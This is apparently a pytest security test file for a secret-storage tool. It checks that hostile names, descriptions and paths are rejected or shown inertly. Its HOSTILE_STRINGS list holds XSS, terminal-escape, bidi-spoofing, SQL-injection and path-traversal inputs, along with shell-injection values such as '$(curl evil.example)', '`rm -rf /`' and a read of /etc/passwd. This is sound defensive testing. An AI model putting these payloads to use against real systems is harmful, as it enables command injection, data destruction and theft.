"""SPEC.md §36 — hostile metadata is rejected or rendered inertly, never trusted."""

from __future__ import annotations

import asyncio
import json
import random
import string
from typing import Any

import pytest

from tests.support.harness import Harness
from veil.adapters.base import AdapterError
from veil.adapters.env_file import EnvFileAdapter
from veil.errors import VeilError
from veil.model import Environment
from veil.redaction import safe_display

pytestmark = pytest.mark.security

BIDI_OVERRIDE = "\u202e"
BIDI_POP = "\u202c"
ISOLATE_OPEN = "\u2066"
ISOLATE_CLOSE = "\u2069"
ZERO_WIDTH = "\u200b"

HOSTILE_STRINGS = [
    "A" * 5000,
    "\x00nullbyte",
    "line\nbreak\rinjection",
    "\x1b[2J\x1b[1;1HTERMINAL TAKEOVER",
    "\x1b]0;window title\x07",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    f"{BIDI_OVERRIDE}evitcurtsed{BIDI_POP}",
    f"{ISOLATE_OPEN}spoofed{ISOLATE_CLOSE}",
    f"{ZERO_WIDTH * 3}hidden",
    "../../etc/profile",
    "..\\..\\windows\\system32",
    "file:///etc/passwd",
    "http://evil.example/?x=1",
    f"acme-dev{ZERO_WIDTH}-project",
    "\u00e1cme\u2013dev",
    "\U0001f510" * 100,
    "'; DROP TABLE secrets; --",
    "$(curl evil.example)",
    "`rm -rf /`",
    "${IFS}cat${IFS}/etc/passwd",
]


@pytest.mark.parametrize("hostile", HOSTILE_STRINGS)
def test_hostile_metadata_is_rejected_or_rendered_inertly(
    harness: Harness, store_args: dict[str, Any], hostile: str
) -> None:
    payload = harness.call_tool(
        "secret.store",
        {**store_args, "name": hostile, "description": hostile, "target": {"project": hostile}},
    )
    assert isinstance(payload, dict)

    if payload.get("status") == "failed":
        assert payload["code"] in {
            "INVALID_TARGET",
            "INVALID_ARGUMENTS",
            "FORBIDDEN_FIELD",
            "UNKNOWN_DESTINATION",
        }
        return

    body = harness.get(harness.path_for(payload)).body
    # Hostile markup survives only as inert, escaped text.
    lowered = body.lower()
    assert "<script" not in lowered
    assert "<img" not in lowered
    if "<" in hostile:
        assert "&lt;" in body
    for char in ("\x1b", "\x00", BIDI_OVERRIDE, ISOLATE_OPEN, ZERO_WIDTH):
        assert char not in body


def test_terminal_and_bidi_sequences_are_neutralised_in_audit_records(
    harness: Harness, store_args: dict[str, Any]
) -> None:
    harness.call_tool(
        "secret.store",
        {
            **store_args,
            "name": f"A\x1b[31mRED{BIDI_OVERRIDE}B",
            "target": {"project": "acme-dev-project"},
        },
    )
    rendered = harness.log_stream.getvalue()
    assert "\x1b" not in rendered
    assert BIDI_OVERRIDE not in rendered


def test_random_target_payloads_never_raise_unexpected_exceptions(
    harness: Harness, store_args: dict[str, Any]
) -> None:
    rng = random.Random(20260817)
    alphabet = string.printable + BIDI_OVERRIDE + ZERO_WIDTH + "\x00\U0001f510"

    for _ in range(300):
        target = {
            rng.choice(["project", "secret", "path", "key", "collection", "junk"]): "".join(
                rng.choice(alphabet) for _ in range(rng.randint(0, 40))
            )
            for _ in range(rng.randint(0, 4))
        }
        payload = harness.call_tool("secret.store", {**store_args, "target": target})
        assert isinstance(payload, dict)
        assert "request_id" in payload or payload.get("status") == "failed"


def test_env_adapter_rejects_traversal_and_hostile_paths(config: Any) -> None:
    adapter = EnvFileAdapter(config)
    for path in (
        "../../etc/profile",
        "../outside.env",
        "/etc/passwd",
        "\x00.env",
        "sub/../../escape.env",
    ):
        with pytest.raises(AdapterError):
            asyncio.run(
                adapter.normalize_target(
                    {"path": path},
                    name="TOKEN",
                    environment_hint=Environment.UNKNOWN,
                )
            )


def test_deeply_nested_json_is_bounded(harness: Harness, store_args: dict[str, Any]) -> None:
    node: dict[str, Any] = {}
    current = node
    for _ in range(200):
        current["secret"] = {}
        current = current["secret"]
    payload = harness.call_tool("secret.store", {**store_args, "target": node})
    assert payload["status"] == "failed"
    assert json.dumps(payload)  # the failure itself is serializable and bounded


def test_safe_display_is_idempotent_and_bounded() -> None:
    for hostile in HOSTILE_STRINGS:
        once = safe_display(hostile)
        assert safe_display(once) == once
        assert len(once) <= 256


def test_parse_errors_are_public_errors_not_crashes(harness: Harness) -> None:
    for arguments in (None, [], "string", 42, {"destination": None}, {"target": []}):
        response = harness.rpc("tools/call", {"name": "secret.store", "arguments": arguments})
        result = response["result"]
        assert result["isError"] is True
        payload = result["structuredContent"]
        assert payload["status"] == "failed"
        with pytest.raises(KeyError):
            payload["secret"]


def test_broker_rejects_non_string_request_ids(harness: Harness) -> None:
    for bad in (None, 42, [], {}, "req_does_not_exist"):
        with pytest.raises(VeilError):
            harness.broker.public_status(bad)
